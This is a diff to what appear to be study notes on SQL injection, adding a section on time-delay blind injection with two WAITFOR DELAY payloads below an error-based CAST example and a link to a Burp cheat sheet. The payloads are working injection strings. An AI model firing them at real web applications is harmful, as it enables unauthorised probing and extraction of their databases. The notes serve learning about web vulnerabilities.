@@ -34,5 +34,12 @@ Take care about the error output, because it has to show us a error realted to E
 ```
 CAST((SELECT example_column FROM example_table) AS int)
 ```
+# Exploiting blind SQL injection by triggering time delays
+Take care on the use of ";" because the most common is "||"
+```
+'|| WAITFOR DELAY '0:0:10'--
+'; IF (1=1) WAITFOR DELAY '0:0:10'--
+```
+
 # Exploiting blind SQL injection using out-of-band (OAST) techniques
 [Cheat Sheet Burp](https://portswigger.net/web-security/sql-injection/cheat-sheet)
